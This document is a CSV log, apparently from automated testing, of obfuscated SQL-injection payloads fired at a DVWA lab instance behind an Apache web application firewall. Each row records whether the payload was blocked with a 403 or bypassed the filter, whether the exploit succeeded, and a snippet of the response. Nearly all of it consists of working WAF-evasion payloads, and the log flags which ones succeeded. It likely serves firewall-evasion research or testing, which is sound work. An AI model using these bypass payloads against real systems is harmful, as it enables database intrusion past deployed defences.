Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0%27<@=1.%0bor+not%0b{`if`+1}=1=+(not%0b{x%0b(select+1)}=1)%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0259,73.69,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+or+!+{`if`+1}=1=%0b(not%0b{x%0b(select%0b1)}=1)%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.0476,73.69,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+||%0bfalse=+(not%0btrue)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0844,73.69,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+||%0b!%0b{x+(select+1)}=1=+(!%0b{`if`+1}=1)+,Blocked,No,None,Invalid,0.0239,73.69,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1.+||+not+{`if`%0b1}=1=%0b(not+{`if`+1}=1)%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.0219,73.69,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0bor+!%0b{`if`+1}=1=%0b(not+{a+1}=1)+or',Bypassed,No,None,Invalid,0.0159,73.69,No,500,
0%27<@=.1%0bor+!+{x+(select%0b1)}=1=%0b(not+{x%0b(select+1)}=1),Bypassed,Yes,Yes (unionAtk),Invalid,0.0297,73.69,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1%0bor%0bnot+{a%0b1}=1=+(not%0b{x%0b(select+1)}=1)+,Bypassed,No,None,Invalid,0.0384,73.69,No,500,
0'<@!=1%0bor+not+{a%0b1}=1=+(!+{x%0b(select+1)}=1)--,Bypassed,No,None,Invalid,0.0258,73.69,No,500,
0%27<@=1%0b||%0bnot+true=+(not+{`if`+1}=1)%0b||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0303,73.69,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+||%0b!%0b{x%0b(select+1)}=1=%0b(!~false)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.019,73.69,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+or+!%0b{a%0b1}=1=%0b(!+{`if`%0b1}=1)%0b||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0231,73.69,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+||%0bnot+{x+(select+1)}=1=+(not%0b{x%0b(select+1)}=1),Blocked,No,None,Invalid,0.0411,73.69,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.%0b||%0bnot+true=%0b(!+{`if`+1}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0569,73.69,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+or+!%7e0=+(!+{x%0b(select%0b1)}=1)%0b||',Bypassed,No,None,Invalid,0.0395,73.69,No,500,
0%27<@!=.1+||%0bnot+{`if`+1}=1=%0b(not+{`if`+1}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0355,73.69,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1%0bor%0bnot+{x%0b(select%0b1)}=1=+(not+{a+1}=1)%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0333,73.69,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+||+!%7efalse=+(not%0b{x%0b(select+1)}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0301,73.69,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+||%0b{x+(select%0b1)}=1+like%0b{x%0b(select%0b1)}=1%23,Bypassed,No,None,Invalid,0.0388,73.69,No,500,
0%27<@!=1+||%0b!%7e0=+(!%0b{x+(select%0b1)}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0738,73.69,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1+||+not%0b{a+1}=1=+(not+1)+||',Blocked,No,None,Invalid,0.0381,73.69,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1%0bor%0bnot+{x+(select+1)}=1=+(not+{a+1}=1)+,Bypassed,Yes,Yes (unionAtk),Invalid,0.043,73.69,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.%0b||%0bnot+{`if`+1}=1=%0b(!+{x+(select%0b1)}=1)%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0398,72.7,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+||+!+{`if`+1}=1=%0b(false)+or%27,Bypassed,No,None,Invalid,0.0326,72.7,No,500,
0%27<@=1+||+not+{a+1}=1=+(!%0b{x%0b(select+1)}=1)+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0159,72.7,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1%0b||%0bnot%0b{x%0b(select%0b1)}=1=+(not%0b{x+(select+1)}=1),Bypassed,No,None,Invalid,0.0328,72.7,No,500,
0%27<@=1.+or+!~0=+(!+{x+(select%0b1)}=1)%0bor',Blocked,No,None,Invalid,0.0478,72.7,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=.1%0b||+not%7e0=+(!%0b{x%0b(select+1)}=1)%0bor',Bypassed,No,None,Invalid,0.0431,72.7,No,500,
0%27<@=.1+||+!+{x+(select%0b1)}=1=%0b(not%0b{`if`%0b1}=1)+,Blocked,No,None,Invalid,0.0109,72.7,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27or+!@<@.+or%0bnot~0=+(!%0b{`if`%0b1}=1)+or%27,Blocked,No,None,Invalid,0.0259,72.7,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=.1+or%0btrue+like+{`if`+1}=1+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.023,72.7,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.%0bor%0bnot+{a%0b1}=1=+(not+{`if`+1}=1)--%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0288,72.7,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+or%0b!+{x+(select%0b1)}=1=%0b(!%0b{x+(select+1)}=1,Blocked,No,None,Invalid,0.0225,72.7,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1%0bor+not+{x+(select%0b1)}=1=+(!+{x%0b(select%0b1)}=1,Bypassed,No,None,Invalid,0.0293,72.7,No,500,
0%27<@=1.+||+not+{x%0b(select+1)}=1=%0b(not+{a%0b1}=1)+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0271,72.7,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1+or+!%0b{`if`%0b1}=1=%0b(not%0b{a+1}=1)+||%27,Bypassed,No,None,Invalid,0.052,72.7,No,500,
0'||%0b@<@.%0bor+!+{a+1}=1=+(false)+||%27,Bypassed,No,None,Invalid,0.0624,72.7,No,500,
0%27<@!=1.%0bor+!%0b{x+(select%0b1)}=1=%0b(!+true)+||',Bypassed,No,None,Invalid,0.0615,73.07,No,500,
0%27<@=.1+||%0bnot%0b{`if`+1}=1=+(not+{x+(select%0b1)}=1)%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.019,73.56,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.%0bor%0bnot~false=%0b(!+{a+1}=1)%0bor%27,Bypassed,No,None,Invalid,0.0345,73.69,No,500,
0'<@!=1%0b||+!%0b{a%0b1}=1=%0b(!%0b{x+(select%0b1)}=1)+,Bypassed,No,None,Invalid,0.0184,73.69,No,500,
0%27<@!=1%0b||+!%0b{a%0b1}=1=+(!%7efalse)--%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0383,73.69,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+or+0=%0b(not%0b{a+1}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0447,73.69,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.%0bor%0b{x%0b(select%0b1)}=1%0blike%0b{a%0b1}=1+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0345,73.69,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1%0b||+!%7efalse=+(not+{x+(select%0b1)}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0357,73.69,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1%0b||+!+true=+(not+{a+1}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0485,73.69,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0b||+!+{x+(select+1)}=1=+(!%7efalse)%0b||%27,Bypassed,No,None,Invalid,0.0514,73.69,No,500,
0'<@=.1+||+!%0b{x+(select+1)}=1=%0b(not%0b{x%0b(select+1)}=1),Bypassed,No,None,Invalid,0.0731,73.69,No,500,
0'<@=1%0bor+!%0b{x%0b(select%0b1)}=1=+(not+{x+(select%0b1)}=1),Bypassed,No,None,Invalid,0.0317,73.69,No,500,
0'<@=.1+||+~%0b{a+1}=1=+({x+(select%0b1)}=1)+||%27,Blocked,No,None,Invalid,0.0295,73.69,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1%0b||+not%0b{a+1}=1=%0b(not%0b1)+||%27,Bypassed,No,None,Invalid,0.0203,73.69,No,500,
0%27<@!=.1%0b||%0b!+{a%0b1}=1=%0b(not+{x%0b(select+1)}=1)+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0246,73.69,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+||%0bfalse=+(not+{x+(select+1)}=1)%0bor%27,Bypassed,No,None,Invalid,0.0182,73.69,No,500,
0%27<@!=.1+or+!%0b{x+(select+1)}=1=+(not+{x+(select+1)}=1,Bypassed,Yes,Yes (unionAtk),Invalid,0.0324,73.69,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+or+!%0b{a%0b1}=1=+(not+{x%0b(select+1)}=1)+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0473,73.69,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1+or+not%0b{x%0b(select%0b1)}=1=%0b(0)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0496,73.69,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1%0bor+!+{a+1}=1=+(not+{a%0b1}=1)+or',Bypassed,No,None,Invalid,0.0165,73.69,No,500,
0'||+1<@.%0b||+!+{x+(select+1)}=1=%0b(not+{x%0b(select,Blocked,No,None,Invalid,0.0176,73.69,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1.+or+!%0b{x+(select%0b1)}=1=+(!%0b{a%0b1}=1)+,Bypassed,No,None,Invalid,0.0427,73.69,No,500,
0%27<@=.1+or%0bnot%0b{`if`+1}=1=%0b(!+{`if`+1}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0299,73.69,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+||+not+{a+1}=1=+(not+true)--+,Blocked,No,None,Invalid,0.0507,73.69,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27or+@<@.+||%0b!%0b{x+(select%0b1)}=1=+(!%0b{`if`%0b1}=1,Bypassed,Yes,Yes (unionAtk),Invalid,0.0552,73.69,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
